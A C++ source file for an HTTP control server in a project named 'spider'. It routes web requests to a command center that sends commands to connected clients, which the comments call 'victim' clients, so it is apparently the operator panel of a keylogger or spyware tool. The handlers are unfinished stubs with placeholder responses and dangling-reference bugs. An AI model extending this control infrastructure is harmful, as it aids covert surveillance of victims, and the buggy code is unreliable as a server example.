#include <chrono>
#include <thread>
#include "WebServer.h"
#include "Logger.hpp"
#include "WebServer.h"

namespace spider
{
namespace http
{

WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const &running, std::uint32_t port) : AControl(cmdCenter, running), m_port(port), m_routes(), m_io_service(),
  m_acceptor(m_io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), m_port)), m_cmdCenter(cmdCenter), m_running(running), m_clientCount(0)
{
  nope::log::Log(Info) << "Creating WebServer";
  nope::log::Log(Debug) << "creating default and custom routes for WebServer";
  m_routes["/404"] = [&](std::uint32_t askId)
  {
      std::uint32_t id = 0; //victim client's id

      nope::log::Log(Info) << "Someone requested 404";
      server::Event ev;
      ev.destId = id;
      ev.emitter = this;
      ev.askId = askId;
      ev.commandName = "404";
      sendEvent(ev);
      //TODO: remove
      ev.response.setResponse("404");
      m_responseQueue.push(ev);
  };

  m_routes["/"] = [&](std::uint32_t askId)
  {
      std::uint32_t id = 0; //victim client's id

      nope::log::Log(Info) << "Someone requested commandsInfo";
      server::Event ev;
      ev.destId = id;
      ev.emitter = this;
      ev.askId = askId;
      ev.commandName = "commandInfo";
      sendEvent(ev);
      //TODO: remove
      ev.response.setResponse("CommandInfo");
      m_responseQueue.push(ev);
  };

  m_routes["/nb"] = [&](std::uint32_t askId)
  {
      std::uint32_t id = 0; //victim client's id

      nope::log::Log(Info) << "Someone requested the number of client";
      server::Event ev;
      ev.destId = id;
      ev.emitter = this;
      ev.askId = askId;
      ev.commandName = "clientCount";
      sendEvent(ev);
      //TODO: remove
      ev.response.setResponse("ClientCount");
      m_responseQueue.push(ev);
  };

  for (auto const &cur : m_commands)
  {
    nope::log::Log(Info) << "route: " << cur.name;
    m_routes["/" + cur.name] = [&](std::uint32_t askId)
    {
      std::uint32_t id = 0; //victim client's id

      std::string url ("/" + cur.name);
      std::stringstream ss(url.substr(url.find_last_of("/") + 1));
      ss >> id;

      nope::log::Log(Info) << "route for: " << url << " requested on client " << id;

      server::Event ev;
      ev.destId = id;
      ev.emitter = this;
      ev.askId = askId;
      ev.commandName = cur.name;
      sendEvent(ev);

      //TODO: TEST ONLY TO REMOVE !!!
      m_responseQueue.push(ev);

      /*sleep(10);
        std::stringstream res;
        std::string sHTML = "GETINFO HERE";
        res << "HTTP/1.1 200 OK" << std::endl;
        res << "content-type: text/html" << std::endl;
        res << "content-length: " << sHTML.length() << std::endl;
        res << std::endl;
        res << sHTML;
        return (res.str());*/
    };
  }
}

WebServer::~WebServer()
{
}

bool WebServer::pollEvent(server::Event &ev)
{
  return (AControl::pollEvent(ev));
}

void WebServer::sendResponse(server::Event &ev)
{
  AControl::sendResponse(ev);
}

void WebServer::sendEvent(server::Event &ev)
{
  AControl::sendEvent(ev);
}

void WebServer::run()
{
  m_acceptor.listen();
  acceptClient(m_acceptor, m_io_service, m_routes, m_clientCount, m_clients);
  nope::log::Log(Info) << "WebServer started on port: " << m_port << "." << std::endl;
  //TODO: running gestion
  while (m_running)
  {
    m_io_service.poll_one();
    m_io_service.reset();
    checkResponse();
  }
}

void WebServer::checkResponse()
{
  while (!m_responseQueue.empty())
  {
    nope::log::Log(Info) << "Event response found";
    server::Event ev = m_responseQueue.front();
    std::string res;
    if (ev.response.getResponse() == "CommandInfo")
    {
      //create JSON HERE
      res = "all Commands: de, dfew, wef wef, we, we, we,g \r\n";
    }
    else if (ev.response.getResponse() == "ClientCount")
    {
      //create json with number of client here
      res = "42\r\n";
    }
    else if (ev.response.getResponse() == "404")
    {
      //send 404 page here
      res = "404\r\n";
    }
    std::stringstream ss;
    ss << "HTTP/1.1 200 OK" << std::endl;
    ss << "content-type: text/html" << std::endl;
    ss << "content-length: " << res.length() << std::endl;
    ss << std::endl;
    ss << res;
    ss << "\r\n";
    m_responseQueue.pop();
    for (auto &client : m_clients)
    {
      if (ev.askId == client->getId())
      {
        std::shared_ptr<std::string> str = std::make_shared<std::string>(ss.str());
        boost::asio::async_write(client->getSocket(), boost::asio::buffer(str->c_str(), str->length()),
            [&client, str](boost::system::error_code const &e, std::size_t n)
            {
            nope::log::Log(Debug) << "wrtting on socket...";
            });
        nope::log::Log(Info) << "sending response to AControl's client";
        break;
      }
    }
  }
}

void WebServer::acceptClient(boost::asio::ip::tcp::acceptor &acceptor, boost::asio::io_service &io_service,
    std::map<std::string, std::function<void(std::uint32_t)>> &routes, std::uint32_t &clientCount, std::vector<std::shared_ptr<HTTPUserSession>> &clients)
{
  std::shared_ptr<HTTPUserSession> client = std::make_shared<HTTPUserSession>(io_service, routes, clientCount++);
  clients.push_back(client);
  acceptor.async_accept(client->getSocket(), [client, &acceptor, &io_service, &routes, &clientCount, &clients](const boost::system::error_code &e)
      {
      WebServer::acceptClient(acceptor, io_service, routes, clientCount, clients);
      if (!e)
      {
      client->sessionStart(client);
      }
      else
      {
      nope::log::Log(Error) << "cannot accept client on WebServer :/";
      }
      });
}

void WebServer::addRoute(std::string url, std::function<void(std::uint32_t)> x)
{
  m_routes[url] = x;
}
}
}
